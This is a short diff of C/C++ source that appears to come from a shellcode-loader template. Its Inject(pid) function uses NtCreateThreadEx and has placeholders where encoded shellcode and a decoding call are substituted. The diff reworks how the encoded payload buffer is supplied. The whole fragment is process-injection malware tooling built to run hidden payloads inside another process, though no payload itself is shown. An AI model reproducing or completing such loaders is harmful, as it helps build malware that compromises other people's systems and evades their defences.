@@ -82,15 +82,12 @@ using myNtCreateThreadEx = NTSTATUS(NTAPI*)(PHANDLE hThread, ACCESS_MASK Desired
 int Inject(int pid) {
 
 
-	const unsigned char raw[] = ####SHELLCODE####;
-	int length = sizeof(raw);
+    int length = ####SHELLCODE_LENGTH####;
+    unsigned char* encoded = ####SHELLCODE####;
 
-	unsigned char* encoded = (unsigned char*)malloc(sizeof(unsigned char) * length * 2);
-	memcpy(encoded, raw, length);
+    //####CALL####
 
-	//####CALL####
-
-	unsigned char* decoded = encoded;
+    unsigned char* decoded = encoded;
 
 	LPVOID allocation_start;
 	STARTUPINFO si;
